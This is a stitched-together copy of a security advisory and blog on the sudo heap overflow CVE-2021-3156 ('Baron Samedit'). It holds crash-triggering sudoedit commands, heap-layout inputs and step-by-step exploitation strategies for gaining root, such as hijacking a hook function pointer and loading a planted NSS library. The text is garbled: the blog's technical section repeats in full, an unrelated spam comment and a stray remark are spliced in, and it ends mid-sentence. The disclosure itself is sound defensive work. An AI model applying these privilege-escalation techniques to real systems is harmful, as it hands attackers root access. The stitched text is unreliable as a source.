267     proglen = strlen(progname);
268     if (proglen > 4 && strcmp(progname + proglen - 4, "edit") == 0) {
269         progname = "sudoedit";
270         mode = MODE_EDIT;
271         sudo_settings[ARG_SUDOEDIT].value = "true";
272     }
------------------------------------------------------------------------
```

Consequently, if we execute “sudoedit -s”, then we set both MODE\_EDIT and MODE\_SHELL (but not MODE\_RUN), we avoid the escape code, reach the vulnerable code, and overflow the heap-based buffer “user\_args” through a command-line argument that ends with a single backslash character:

```
---------------------------------------------------------------------
sudoedit -s '\' `perl -e 'print "A" x 65536'`
malloc(): corrupted top size
Aborted (core dumped)
---------------------------------------------------------------------
```

From an attacker’s point of view, this buffer overflow is ideal due to following reasons:

1) The attacker controls the size of the “user\_args” buffer that can be overflowed (the size of our concatenated command-line arguments, at lines 852-854);

2) The attacker independently controls the size and contents of the overflow itself (our last command-line argument is conveniently followed by our first environment variables, which are not included in the size calculation at lines 852-853);

3) The attacker can even write null bytes to the buffer that was overflowed (every command-line argument or environment variable that ends with a single backslash writes a null byte to “user\_args”, at lines 866-868).

For example, on an amd64 Linux, the following command allocates a 24-byte “user\_args” buffer (a 32-byte heap chunk) and overwrites the next chunk’s size field with “A=a\0B=b\0” (0x00623d4200613d41), its fd field with “C=c\0D=d\0” (0x00643d4400633d43), and its bk field with “E=e\0F=f\0” (0x00663d4600653d45):

```
---------------------------------------------------------------------
env -i 'AA=a\' 'B=b\' 'C=c\' 'D=d\' 'E=e\' 'F=f' sudoedit -s '1234567890123456789012\'
---------------------------------------------------------------------

--|--------+--------+--------+--------|--------+--------+--------+--------+--
  |        |        |12345678|90123456|789012.A|A=a.B=b.|C=c.D=d.|E=e.F=f.|
--|--------+--------+--------+--------|--------+--------+--------+--------+--

              size  <---- user_args buffer ---->  size      fd       bk
```

## Frequently Asked Questions (FAQs)

### What versions are vulnerable?

The following versions of sudo are vulnerable:

* All legacy versions from 1.8.2 to 1.8.31p2
* All stable versions from 1.9.0 to 1.9.5p1

### How can I test if I have vulnerable version?

To test if a system is vulnerable or not, login to the system as a non-root user.

Run command “sudoedit -s /”

If the system is vulnerable, it will respond with an error that starts with “sudoedit:”

If the system is patched, it will respond with an error that starts with “usage:”

### Are versions before 1.8.2 vulnerable?

No. See explanation above.

### I’m running a vulnerable version of sudo from the list mentioned above. Why does the test show my host is not vulnerable?

Operating system vendors don’t always update the software’s version number after introducing a patch to the software, particularly when they backport the patch. For example, Ubuntu released a patch (USN-4705-1) for Ubuntu 20.04, but the patched version is still 1.8.31 after the patch is installed.

### Why am I seeing multiple QIDs for the same CVE-2021-3156 on the same host?

Qualys released a generic QID at the time of release which detected the vulnerability based on the output of the command `sudoedit`. Later on, as OS vendors released patches, we released QIDs based on package versions as well. So, it is possible for a vulnerable asset to have the vulnerability reported for QID 374891, and OS specific checks that were released later on.

### What are the possible reasons for QID 374891 not triggering against vulnerable systems?

QID 374891 was released with vulnsigs version VULNSIGS-2.5.90-4 and in Linux Cloud Agent manifest version lx\_manifest-2.5.90.4-3. For the vulnerabilities to be reported these signature and manifest versions need to be available on the platform (the deployment schedule varies), and agents have completed a scan with the latest versions of the signatures.

Also, Qualys released more QIDs based on the security advisories and patches released by various Linux distributions. So certain Linux distributions had coverage before the rest. For e.g., Amazon Linux security advisory was released first, and CentOS advisories, and patches were released couple of days later. Support for CentOS linux was added to later versions vulnsigs and manifests. See table above for details.

### For CVE-2021-3156, what is the difference in the detection logic between QID 374891 and the rest of the QIDs?

QID 374891 attempts to confirm the vulnerability based on output of command `sudoedit`. The rest of the QIDs confirm the vulnerability based on version comparison based on the versions disclosed by the OS vendor in their respective security advisories.

### Is a local user required to exploit the vulnerability?

Yes. However, this user does not need to be a privileged user or be a part of sudoers list. For example, even account ‘nobody’ can exploit the issue.

### Why name the vulnerability “Baron Samedit”?

It’s a play on Baron Samedi and sudoedit.

### Will Qualys Research Team publish exploit code for this vulnerability?

No**.**

   First of all I would like to say awesome blog! I had a quick question which I’d like to ask if you don’t mind. I was interested to find out how you center yourself and clear your mind prior to writing. I have had trouble clearing my thoughts in getting my thoughts out there. I do take pleasure in writing however it just seems like the first 10 to 15 minutes are usually wasted just trying to figure out how to begin. Any recommendations or hints? Many thanks!|

**Update Feb 3, 2021**: It [has been reported](https://twitter.com/hackerfantastic/status/1356645638151303169) that macOS, AIX, and
Solaris are also vulnerable to CVE-2021-3156, and that others may also
still be vulnerable. Qualys has not independently verified the exploit.

**Original Post**: The Qualys Research Team has discovered a heap overflow vulnerability in sudo, a near-ubiquitous utility available on major Unix-like operating systems. Any unprivileged user can gain root privileges on a vulnerable host using a default sudo configuration by exploiting this vulnerability.

Sudo is a powerful utility that’s included in most if not all Unix- and Linux-based OSes. It allows users to run programs with the security privileges of another user. The vulnerability itself has been hiding in plain sight for nearly 10 years. It was introduced in July 2011 (commit 8255ed69) and affects all legacy versions from 1.8.2 to 1.8.31p2 and all stable versions from 1.9.0 to 1.9.5p1 in their default configuration.

Successful exploitation of this vulnerability allows any unprivileged user to gain root privileges on the vulnerable host. Qualys security researchers have been able to independently verify the vulnerability and develop multiple variants of exploit and obtain full root privileges on Ubuntu 20.04 (Sudo 1.8.31), Debian 10 (Sudo 1.8.27), and Fedora 33 (Sudo 1.9.2). Other operating systems and distributions are also likely to be exploitable.

As soon as the Qualys research team confirmed the vulnerability, Qualys engaged in responsible vulnerability disclosure and coordinated with sudo’s author and open source distributions to announce the vulnerability.

## Disclosure Timeline

* 2021-01-13: Advisory sent to Todd.Miller@sudo
* 2021-01-19: Advisory and patches sent to distros@openwall
* 2021-01-26: Coordinated Release Date (6:00 PM UTC)

## Proof of Concept Video

## Technical Details

If Sudo is executed to run a command in “shell” mode (shell -c command):

* either through the -s option, which sets Sudo’s MODE\_SHELL flag; OR
* through the -i option, which sets Sudo’s MODE\_SHELL and MODE\_LOGIN\_SHELL flags; then, at the beginning of Sudo’s main(), parse\_args() rewrites argv (lines 609-617), by concatenating all command-line arguments (lines 587-595) and by escaping all meta-characters with backslashes (lines 590-591):

```
--------------------------------------------------------------------
571     if (ISSET(mode, MODE_RUN) && ISSET(flags, MODE_SHELL)) {
572         char **av, *cmnd = NULL;
573         int ac = 1;
...
581             cmnd = dst = reallocarray(NULL, cmnd_size, 2);
...
587             for (av = argv; *av != NULL; av++) {
588                 for (src = *av; *src != '\0'; src++) {
589                     /* quote potential meta characters */
590                     if (!isalnum((unsigned char)*src) && *src != '_' && *src != '-' && *src != '$')
591                         *dst++ = '\\';
592                     *dst++ = *src;
593                 }
594                 *dst++ = ' ';
595             }
...
600             ac += 2; /* -c cmnd */
...
603         av = reallocarray(NULL, ac + 1, sizeof(char *));
...
609         av[0] = (char *)user_details.shell; /* plugin may override shell */
610         if (cmnd != NULL) {
611             av[1] = "-c";
612             av[2] = cmnd;
613         }
614         av[ac] = NULL;
615
616         argv = av;
617         argc = ac;
618     }
---------------------------------------------------------------------
```

Later, in sudoers\_policy\_main(), set\_cmnd() concatenates the command-line arguments into a heap-based buffer “user\_args” (lines 864-871) and unescapes the meta-characters (lines 866-867), “for sudoers matching and logging purposes”:

```
--------------------------------------------------------------
819     if (sudo_mode & (MODE_RUN | MODE_EDIT | MODE_CHECK)) {
...
852             for (size = 0, av = NewArgv + 1; *av; av++)
853                 size += strlen(*av) + 1;
854             if (size == 0 || (user_args = malloc(size)) == NULL) {
...
857             }
858             if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) {
...
864                 for (to = user_args, av = NewArgv + 1; (from = *av); av++) {
865                     while (*from) {
866                         if (from[0] == '\\' && !isspace((unsigned char)from[1]))
867                             from++;
868                         *to++ = *from++;
869                     }
870                     *to++ = ' ';
871                 }
...
884             }
...
886     }
---------------------------------------------------------------------
```

Unfortunately, if a command-line argument ends with a single backslash character, then:

* at line 866, “from[0]” is the backslash character, and “from[1]” is the argument’s null terminator (i.e., not a space character);
* at line 867, “from” is incremented and points to the null terminator;
* at line 868, the null terminator is copied to the “user\_args” buffer, and “from” is incremented again and points to the first character after the null terminator (i.e., out of the argument’s bounds);
* the “while” loop at lines 865-869 reads and copies out-of-bounds characters to the “user\_args” buffer.

In other words, set\_cmnd() is vulnerable to a heap-based buffer overflow, because the out-of-bounds characters that are copied to the “user\_args” buffer were not included in its size (calculated at lines852-853).

In theory, however, no command-line argument can end with a single backslash character: if MODE\_SHELL or MODE\_LOGIN\_SHELL is set (line 858, a necessary condition for reaching the vulnerable code), then MODE\_SHELL is set (line 571) and parse\_args() already escaped all meta-characters, including backslashes (i.e., it escaped every single backslash with a second backslash).

In practice, however, the vulnerable code in set\_cmnd() and the escape code in parse\_args() are surrounded by slightly different conditions:

```
---------------------------------------------------------------------
819     if (sudo_mode & (MODE_RUN | MODE_EDIT | MODE_CHECK)) {
...
858             if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) {
---------------------------------------------------------------------
```

versus:

```
---------------------------------------------------------------------
571     if (ISSET(mode, MODE_RUN) && ISSET(flags, MODE_SHELL)) {
---------------------------------------------------------------------
```

Our question is: can we set MODE\_SHELL and either MODE\_EDIT or MODE\_CHECK (to reach the vulnerable code) but not the default MODE\_RUN (to avoid the escape code)?

The answer, it seems, is no: if we set MODE\_EDIT (-e option, line 361) or MODE\_CHECK (-l option, lines 423 and 519), then parse\_args() removes MODE\_SHELL from the “valid\_flags” (lines 363 and 424) and exits with an error if we specify an invalid flag such as MODE\_SHELL (lines 532-533):

```
---------------------------------------------------------------------
358                 case 'e':
...
361                     mode = MODE_EDIT;
362                     sudo_settings[ARG_SUDOEDIT].value = "true";
363                     valid_flags = MODE_NONINTERACTIVE;
364                     break;
...
416                 case 'l':
...
423                     mode = MODE_LIST;
424                     valid_flags = MODE_NONINTERACTIVE|MODE_LONG_LIST;
425                     break;
...
518     if (argc > 0 && mode == MODE_LIST)
519         mode = MODE_CHECK;
...
532     if ((flags & valid_flags) != flags)
533         usage(1);
---------------------------------------------------------------------
```

But we found a loophole: if we execute Sudo as “sudoedit” instead of “sudo”, then parse\_args() automatically sets MODE\_EDIT (line 270) but does not reset “valid\_flags”, and the “valid\_flags” include MODE\_SHELL by default (lines 127 and 249):

```
---------------------------------------------------------------------
127 #define DEFAULT_VALID_FLAGS     (MODE_BACKGROUND|MODE_PRESERVE_ENV|MODE_RESET_HOME|MODE_LOGIN_SHELL|MODE_NONINTERACTIVE|MODE_SHELL)
...
249     int valid_flags = DEFAULT_VALID_FLAGS;
...
267     proglen = strlen(progname);
268     if (proglen > 4 && strcmp(progname + proglen - 4, "edit") == 0) {
269         progname = "sudoedit";
270         mode = MODE_EDIT;
271         sudo_settings[ARG_SUDOEDIT].value = "true";
272     }
------------------------------------------------------------------------
```

Consequently, if we execute “sudoedit -s”, then we set both MODE\_EDIT and MODE\_SHELL (but not MODE\_RUN), we avoid the escape code, reach the vulnerable code, and overflow the heap-based buffer “user\_args” through a command-line argument that ends with a single backslash character:

```
---------------------------------------------------------------------
sudoedit -s '\' `perl -e 'print "A" x 65536'`
malloc(): corrupted top size
Aborted (core dumped)
---------------------------------------------------------------------
```

From an attacker’s point of view, this buffer overflow is ideal due to following reasons:

1) The attacker controls the size of the “user\_args” buffer that can be overflowed (the size of our concatenated command-line arguments, at lines 852-854);

2) The attacker independently controls the size and contents of the overflow itself (our last command-line argument is conveniently followed by our first environment variables, which are not included in the size calculation at lines 852-853);

3) The attacker can even write null bytes to the buffer that was overflowed (every command-line argument or environment variable that ends with a single backslash writes a null byte to “user\_args”, at lines 866-868).

For example, on an amd64 Linux, the following command allocates a 24-byte “user\_args” buffer (a 32-byte heap chunk) and overwrites the next chunk’s size field with “A=a\0B=b\0” (0x00623d4200613d41), its fd field with “C=c\0D=d\0” (0x00643d4400633d43), and its bk field with “E=e\0F=f\0” (0x00663d4600653d45):

```
---------------------------------------------------------------------
env -i 'AA=a\' 'B=b\' 'C=c\' 'D=d\' 'E=e\' 'F=f' sudoedit -s '1234567890123456789012\'
---------------------------------------------------------------------

--|--------+--------+--------+--------|--------+--------+--------+--------+--
  |        |        |12345678|90123456|789012.A|A=a.B=b.|C=c.D=d.|E=e.F=f.|
--|--------+--------+--------+--------|--------+--------+--------+--------+--

              size  <---- user_args buffer ---->  size      fd       bk
```

## Frequently Asked Questions (FAQs)

### What versions are vulnerable?

The following versions of sudo are vulnerable:

* All legacy versions from 1.8.2 to 1.8.31p2
* All stable versions from 1.9.0 to 1.9.5p1

### How can I test if I have vulnerable version?

To test if a system is vulnerable or not, login to the system as a non-root user.

Run command “sudoedit -s /”

If the system is vulnerable, it will respond with an error that starts with “sudoedit:”

If the system is patched, it will respond with an error that starts with “usage:”

### Are versions before 1.8.2 vulnerable?

No. See explanation above.

### I’m running a vulnerable version of sudo from the list mentioned above. Why does the test show my host is not vulnerable?

Operating system vendors don’t always update the software’s version number after introducing a patch to the software, particularly when they backport the patch. For example, Ubuntu released a patch (USN-4705-1) for Ubuntu 20.04, but the patched version is still 1.8.31 after the patch is installed.

### Why am I seeing multiple QIDs for the same CVE-2021-3156 on the same host?

Qualys released a generic QID at the time of release which detected the vulnerability based on the output of the command `sudoedit`. Later on, as OS vendors released patches, we released QIDs based on package versions as well. So, it is possible for a vulnerable asset to have the vulnerability reported for QID 374891, and OS specific checks that were released later on.

### What are the possible reasons for QID 374891 not triggering against vulnerable systems?

QID 374891 was released with vulnsigs version VULNSIGS-2.5.90-4 and in Linux Cloud Agent manifest version lx\_manifest-2.5.90.4-3. For the vulnerabilities to be reported these signature and manifest versions need to be available on the platform (the deployment schedule varies), and agents have completed a scan with the latest versions of the signatures.

Also, Qualys released more QIDs based on the security advisories and patches released by various Linux distributions. So certain Linux distributions had coverage before the rest. For e.g., Amazon Linux security advisory was released first, and CentOS advisories, and patches were released couple of days later. Support for CentOS linux was added to later versions vulnsigs and manifests. See table above for details.

### For CVE-2021-3156, what is the difference in the detection logic between QID 374891 and the rest of the QIDs?

QID 374891 attempts to confirm the vulnerability based on output of command `sudoedit`. The rest of the QIDs confirm the vulnerability based on version comparison based on the versions disclosed by the OS vendor in their respective security advisories.

### Is a local user required to exploit the vulnerability?

Yes. However, this user does not need to be a privileged user or be a part of sudoers list. For example, even account ‘nobody’ can exploit the issue.

### Why name the vulnerability “Baron Samedit”?

It’s a play on Baron Samedi and sudoedit.

### Will Qualys Research Team publish exploit code for this vulnerability?

No**.**

   First of all I would like to say awesome blog! I had a quick question which I’d like to ask if you don’t mind. I was interested to find out how you center yourself and clear your mind prior to writing. I have had trouble clearing my thoughts in getting my thoughts out there. I do take pleasure in writing however it just seems like the first 10 to 15 minutes are usually wasted just trying to figure out how to begin. Any recommendations or hints? Many thanks!|

I just happen to have a very much simplified version called "ssu"; I
worked on it and fixed a few gaping security holes...  They should have
been obvious to any novice programmer (which said idiot^2 boss was not).

Baron Samedit: Heap-based buffer overflow in Sudo (CVE-2021-3156)

========================================================================

Timeline

========================================================================
Summary
========================================================================

We discovered a heap-based buffer overflow in Sudo
(<https://www.sudo.ws/>). This vulnerability:

- is exploitable by any local user (normal users and system users,
  sudoers and non-sudoers), without authentication (i.e., the attacker
  does not need to know the user's password);

- was introduced in July 2011 (commit 8255ed69), and affects all legacy
  versions from 1.8.2 to 1.8.31p2 and all stable versions from 1.9.0 to
  1.9.5p1, in their default configuration.

We developed three different exploits for this vulnerability, and
obtained full root privileges on Ubuntu 20.04 (Sudo 1.8.31), Debian 10
(Sudo 1.8.27), and Fedora 33 (Sudo 1.9.2). Other operating systems and
distributions are probably also exploitable.

========================================================================
Analysis
========================================================================

If Sudo is executed to run a command in "shell" mode (shell -c command):

- either through the -s option, which sets Sudo's MODE_SHELL flag;

- or through the -i option, which sets Sudo's MODE_SHELL and
  MODE_LOGIN_SHELL flags;

then, at the beginning of Sudo's main(), parse_args() rewrites argv
(lines 609-617), by concatenating all command-line arguments (lines
587-595) and by escaping all meta-characters with backslashes (lines
590-591):

------------------------------------------------------------------------
571     if (ISSET(mode, MODE_RUN) && ISSET(flags, MODE_SHELL)) {
572         char **av, *cmnd = NULL;
573         int ac = 1;
...
581             cmnd = dst = reallocarray(NULL, cmnd_size, 2);
...
587             for (av = argv; *av != NULL; av++) {
588                 for (src = *av; *src != '\0'; src++) {
589                     /* quote potential meta characters */
590                     if (!isalnum((unsigned char)*src) && *src != '_' && *src != '-' && *src != '$')
591                         *dst++ = '\\';
592                     *dst++ = *src;
593                 }
594                 *dst++ = ' ';
595             }
...
600             ac += 2; /* -c cmnd */
...
603         av = reallocarray(NULL, ac + 1, sizeof(char *));
...
609         av[0] = (char *)user_details.shell; /* plugin may override shell */
610         if (cmnd != NULL) {
611             av[1] = "-c";
612             av[2] = cmnd;
613         }
614         av[ac] = NULL;
615
616         argv = av;
617         argc = ac;
618     }
------------------------------------------------------------------------

Later, in sudoers_policy_main(), set_cmnd() concatenates the
command-line arguments into a heap-based buffer "user_args" (lines
864-871) and unescapes the meta-characters (lines 866-867), "for sudoers
matching and logging purposes":

------------------------------------------------------------------------
 819     if (sudo_mode & (MODE_RUN | MODE_EDIT | MODE_CHECK)) {
 ...
 852             for (size = 0, av = NewArgv + 1; *av; av++)
 853                 size += strlen(*av) + 1;
 854             if (size == 0 || (user_args = malloc(size)) == NULL) {
 ...
 857             }
 858             if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) {
 ...
 864                 for (to = user_args, av = NewArgv + 1; (from = *av); av++) {
 865                     while (*from) {
 866                         if (from[0] == '\\' && !isspace((unsigned char)from[1]))
 867                             from++;
 868                         *to++ = *from++;
 869                     }
 870                     *to++ = ' ';
 871                 }
 ...
 884             }
 ...
 886     }
------------------------------------------------------------------------

Unfortunately, if a command-line argument ends with a single backslash
character, then:

- at line 866, "from[0]" is the backslash character, and "from[1]" is
  the argument's null terminator (i.e., not a space character);

- at line 867, "from" is incremented and points to the null terminator;

- at line 868, the null terminator is copied to the "user_args" buffer,
  and "from" is incremented again and points to the first character
  after the null terminator (i.e., out of the argument's bounds);

- the "while" loop at lines 865-869 reads and copies out-of-bounds
  characters to the "user_args" buffer.

In other words, set_cmnd() is vulnerable to a heap-based buffer
overflow, because the out-of-bounds characters that are copied to the
"user_args" buffer were not included in its size (calculated at lines
852-853).

In theory, however, no command-line argument can end with a single
backslash character: if MODE_SHELL or MODE_LOGIN_SHELL is set (line 858,
a necessary condition for reaching the vulnerable code), then MODE_SHELL
is set (line 571) and parse_args() already escaped all meta-characters,
including backslashes (i.e., it escaped every single backslash with a
second backslash).

In practice, however, the vulnerable code in set_cmnd() and the escape
code in parse_args() are surrounded by slightly different conditions:

------------------------------------------------------------------------
 819     if (sudo_mode & (MODE_RUN | MODE_EDIT | MODE_CHECK)) {
 ...
 858             if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) {
------------------------------------------------------------------------

versus:

------------------------------------------------------------------------
571     if (ISSET(mode, MODE_RUN) && ISSET(flags, MODE_SHELL)) {
------------------------------------------------------------------------

Our question, then, is: can we set MODE_SHELL and either MODE_EDIT or
MODE_CHECK (to reach the vulnerable code) but not the default MODE_RUN
(to avoid the escape code)?

The answer, it seems, is no: if we set MODE_EDIT (-e option, line 361)
or MODE_CHECK (-l option, lines 423 and 519), then parse_args() removes
MODE_SHELL from the "valid_flags" (lines 363 and 424) and exits with an
error if we specify an invalid flag such as MODE_SHELL (lines 532-533):

------------------------------------------------------------------------
358                 case 'e':
...
361                     mode = MODE_EDIT;
362                     sudo_settings[ARG_SUDOEDIT].value = "true";
363                     valid_flags = MODE_NONINTERACTIVE;
364                     break;
...
416                 case 'l':
...
423                     mode = MODE_LIST;
424                     valid_flags = MODE_NONINTERACTIVE|MODE_LONG_LIST;
425                     break;
...
518     if (argc > 0 && mode == MODE_LIST)
519         mode = MODE_CHECK;
...
532     if ((flags & valid_flags) != flags)
533         usage(1);
------------------------------------------------------------------------

But we found a loophole: if we execute Sudo as "sudoedit" instead of
"sudo", then parse_args() automatically sets MODE_EDIT (line 270) but
does not reset "valid_flags", and the "valid_flags" include MODE_SHELL
by default (lines 127 and 249):

------------------------------------------------------------------------
127 #define DEFAULT_VALID_FLAGS
(MODE_BACKGROUND|MODE_PRESERVE_ENV|MODE_RESET_HOME|MODE_LOGIN_SHELL|MODE_NONINTERACTIVE|MODE_SHELL)
...
249     int valid_flags = DEFAULT_VALID_FLAGS;
...
267     proglen = strlen(progname);
268     if (proglen > 4 && strcmp(progname + proglen - 4, "edit") == 0) {
269         progname = "sudoedit";
270         mode = MODE_EDIT;
271         sudo_settings[ARG_SUDOEDIT].value = "true";
272     }
------------------------------------------------------------------------

Consequently, if we execute "sudoedit -s", then we set both MODE_EDIT
and MODE_SHELL (but not MODE_RUN), we avoid the escape code, reach the
vulnerable code, and overflow the heap-based buffer "user_args" through
a command-line argument that ends with a single backslash character:

------------------------------------------------------------------------
sudoedit -s '\' `perl -e 'print "A" x 65536'`
malloc(): corrupted top size
Aborted (core dumped)
------------------------------------------------------------------------

From an attacker's point of view, this buffer overflow is ideal:

- we control the size of the "user_args" buffer that we overflow (the
  size of our concatenated command-line arguments, at lines 852-854);

- we independently control the size and contents of the overflow itself
  (our last command-line argument is conveniently followed by our first
  environment variables, which are not included in the size calculation
  at lines 852-853);

- we can even write null bytes to the buffer that we overflow (every
  command-line argument or environment variable that ends with a single
  backslash writes a null byte to "user_args", at lines 866-868).

For example, on an amd64 Linux, the following command allocates a
24-byte "user_args" buffer (a 32-byte heap chunk) and overwrites the
next chunk's size field with "A=a\0B=b\0" (0x00623d4200613d41), its fd
field with "C=c\0D=d\0" (0x00643d4400633d43), and its bk field with
"E=e\0F=f\0" (0x00663d4600653d45):

------------------------------------------------------------------------
env -i 'AA=a\' 'B=b\' 'C=c\' 'D=d\' 'E=e\' 'F=f' sudoedit -s '1234567890123456789012\'
------------------------------------------------------------------------

========================================================================
Exploitation
========================================================================

Because Sudo calls localization functions at the very beginning of its
main() function:

------------------------------------------------------------------------
 154     setlocale(LC_ALL, "");
 155     bindtextdomain(PACKAGE_NAME, LOCALEDIR);
 156     textdomain(PACKAGE_NAME);
------------------------------------------------------------------------

and passes translation strings (through the gettext() function and _()
macro) to format-string functions such as:

------------------------------------------------------------------------
 301             sudo_printf(SUDO_CONV_ERROR_MSG, _("%s is not in the sudoers "
 302                 "file.  This incident will be reported.\n"), user_name);
------------------------------------------------------------------------

we initially wanted to reuse halfdog's fascinating technique from
<https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/> and
transform Sudo's heap-based buffer overflow into a format-string
exploit. More precisely:

- at line 154, in setlocale(), we malloc()ate and free() several LC
  environment variables (LC_CTYPE, LC_MESSAGES, LC_TIME, etc), thereby
  creating small holes at the very beginning of Sudo's heap (free fast
  or tcache chunks);

- at line 155, bindtextdomain() malloc()ates a struct binding, which
  contains a dirname pointer to the name of a directory that contains
  ".mo" catalog files and hence translation strings;

- in set_cmnd(), we malloc()ate the "user_args" buffer into one of the
  holes at the beginning of Sudo's heap, and overflow this buffer, thus
  overwriting the struct binding's dirname pointer;

- at line 301 (for example), gettext() (through the _() macro) loads our
  own translation string from the overwritten dirname -- in other words,
  we control the format string that is passed to sudo_printf().

To implement this initial technique, we wrote a rudimentary brute-forcer
that executes Sudo inside gdb, overflows the "user_args" buffer, and
randomly selects the following parameters:

- the LC environment variables that we pass to Sudo, and their length
  (we use the "C.UTF-8" locale and append a random "@modifier");

- the size of the "user_args" buffer that we overflow;

- the size of the overflow itself;

- whether we go through Sudo's authentication code (-A or -n option) or
  not (-u #realuid option).

Unfortunately, this initial technique failed; our brute-forcer was able
to overwrite the struct binding's dirname pointer:

------------------------------------------------------------------------
Program received signal SIGSEGV, Segmentation fault.

0x00007f6e0dde1ea9 in __dcigettext (domainname=domainname@entry=0x7f6e0d9cc020 "sudoers",
msgid1=msgid1@entry=0x7f6e0d9cc014 "user NOT in sudoers", msgid2=msgid2@entry=0x0, plural=plural@entry=0, n=n@entry=0,
category=5) at dcigettext.c:619

=> 0x7f6e0dde1ea9 <__dcigettext+1257>:  cmpb   $0x2f,(%rax)

rax            0x4141414141414141  4702111234474983745
------------------------------------------------------------------------

but LC_MESSAGES was always the default "C" locale (not "C.UTF-8"), which
disables the string translation in gettext() (i.e., gettext() returns
the original format string, not our own).

Fortunately, however, our brute-forcer produced dozens of unique Sudo
crashes and gdb backtraces; among these, three caught our attention, and
we eventually exploited all three.

========================================================================
1/ struct sudo_hook_entry overwrite
========================================================================

The first crash that caught our attention is:

------------------------------------------------------------------------
Program received signal SIGSEGV, Segmentation fault.

0x000056291a25d502 in process_hooks_getenv (name=name@entry=0x7f4a6d7dc046 "SYSTEMD_BYPASS_USERDB",
value=value@entry=0x7ffc595cc240) at ../../src/hooks.c:108

=> 0x56291a25d502 <process_hooks_getenv+82>:    callq  *0x8(%rbx)

rbx            0x56291c1df2b0      94734565372592

0x56291c1df2b0: 0x4141414141414141      0x4141414141414141
------------------------------------------------------------------------

Incredibly, Sudo's function process_hooks_getenv() crashed (at line 108)
because we directly overwrote a function pointer, getenv_fn (a member of
a heap-based struct sudo_hook_entry):

------------------------------------------------------------------------
 99 int
100 process_hooks_getenv(const char *name, char **value)
101 {
102     struct sudo_hook_entry *hook;
103     char *val = NULL;
...
107     SLIST_FOREACH(hook, &sudo_hook_getenv_list, entries) {
108         rc = hook->u.getenv_fn(name, &val, hook->closure);
------------------------------------------------------------------------

To exploit this struct sudo_hook_entry overwrite, we note that:

- the call to getenv_fn (at line 108) is compatible with a call to
  execve():

  . name ("SYSTEMD_BYPASS_USERDB") is compatible with execve()'s
    pathname argument;

  . &val (a pointer to a NULL pointer) is compatible with execve()'s
    argv;

  . hook->closure (a NULL pointer) is compatible with execve()'s envp;

- we can defeat ASLR by partially overwriting the function pointer
  getenv_fn (which points to the function sudoers_hook_getenv() in the
  shared library sudoers.so); and luckily, the beginning of sudoers.so
  contains a call to execve() (or execv()):

------------------------------------------------------------------------
0000000000008a00 <execv@plt>:
    8a00:       f3 0f 1e fa             endbr64
    8a04:       f2 ff 25 65 55 05 00    bnd jmpq *0x55565(%rip)        # 5df70 <execv@GLIBC_2.2.5>
    8a0b:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)
------------------------------------------------------------------------

- we can read /dev/kmsg (dmesg) as an unprivileged user on Ubuntu, and
  therefore obtain detailed information about our Sudo crashes.

Consequently, we adopt the following strategy:

- First, we brute-force the exploit parameters until we overwrite
  getenv_fn with an invalid userland address (above 0x800000000000) --
  until we observe a general protection fault at getenv_fn's call site:

------------------------------------------------------------------------
sudoedit[15904] general protection fault ip:55e9b645b502 sp:7ffe53d6fa40 error:0 in sudo[55e9b644e000+1a000]
                                                     ^^^
------------------------------------------------------------------------

- Next, we reuse these exploit parameters but overwrite getenv_fn with a
  regular pattern of valid (below 0x800000000000) but unmapped userland
  addresses -- in this example, getenv_fn is the 22nd pointer that we
  overwrite (0x32 is '2', a part of our pattern):

------------------------------------------------------------------------
sudoedit[15906]: segfault at 323230303030 ip 0000323230303030 sp 00007ffeeabf2868 error 14 in sudo[55b036c16000+5000]
                             ^^^^
------------------------------------------------------------------------

- Last, we partially overwrite getenv_fn (we overwrite its two least
  significant bytes with 0x8a00, execv()'s offset in sudoers.so, and its
  third byte with 0x00, user_args's null terminator in set_cmnd()) until
  we defeat ASLR -- we have a good chance of overwriting getenv_fn with
  the address of execv() after 2^(3*8-12) = 2^12 = 4096 tries, thus
  executing our own binary, named "SYSTEMD_BYPASS_USERDB", as root.

We successfully tested this first exploit on Ubuntu 20.04.

========================================================================
2/ struct service_user overwrite
========================================================================

The second crash that caught our attention is:

------------------------------------------------------------------------
Program received signal SIGSEGV, Segmentation fault.

0x00007f6bf9c294ee in nss_load_library (ni=ni@entry=0x55cf1a1dd040) at nsswitch.c:344

=> 0x7f6bf9c294ee <nss_load_library+46>:        cmpq   $0x0,0x8(%rbx)

rbx            0x41414141414141    18367622009667905
------------------------------------------------------------------------

The glibc's function nss_load_library() crashed (at line 344) because we
overwrote the pointer "library", a member of a heap-based struct
service_user:

------------------------------------------------------------------------
327 static int
328 nss_load_library (service_user *ni)
329 {
330   if (ni->library == NULL)
331     {
...
338       ni->library = nss_new_service (service_table ?: &default_table,
339                                      ni->name);
...
342     }
343
344   if (ni->library->lib_handle == NULL)
345     {
346       /* Load the shared library.  */
347       size_t shlen = (7 + strlen (ni->name) + 3
348                       + strlen (__nss_shlib_revision) + 1);
349       int saved_errno = errno;
350       char shlib_name[shlen];
351
352       /* Construct shared object name.  */
353       __stpcpy (__stpcpy (__stpcpy (__stpcpy (shlib_name,
354                                               "libnss_"),
355                                     ni->name),
356                           ".so"),
357                 __nss_shlib_revision);
358
359       ni->library->lib_handle = __libc_dlopen (shlib_name);
------------------------------------------------------------------------

We can easily transform this struct service_user overwrite into an
arbitrary code execution:

- we overwrite ni->library with a NULL pointer, to enter the block at
  lines 330-342, avoid the crash at line 344, and enter the block at
  lines 344-359;

- we overwrite ni->name (an array of characters, initially "systemd")
  with "X/X";

- lines 353-357 construct the name of a shared library "libnss_X/X.so.2"
  (instead of "libnss_systemd.so.2");

- at line 359, we load our own shared library "libnss_X/X.so.2" from the
  current working directory and execute our _init() constructor as root.

We successfully tested this second exploit on Ubuntu 20.04, Debian 10,
and Fedora 33.

========================================================================
3/ def_timestampdir overwrite
========================================================================

Our third exploit is not derived from one of Sudo's crashes, but from a
casual observation: during our brute-force, Sudo created dozens of new
directories in our current working directory (AAAAAA, AAAAAAAAA, etc).
Each of these directories belongs to root and contains only one small
file, named after our own user: Sudo's timestamp file -- we evidently
overwrote def_timestampdir, the name of Sudo's timestamp directory.

If we overwrite def_timestampdir with the name of a directory that does
not already exist, then we can race against Sudo's ts_mkdirs(), create a
symlink to an arbitrary file, and:

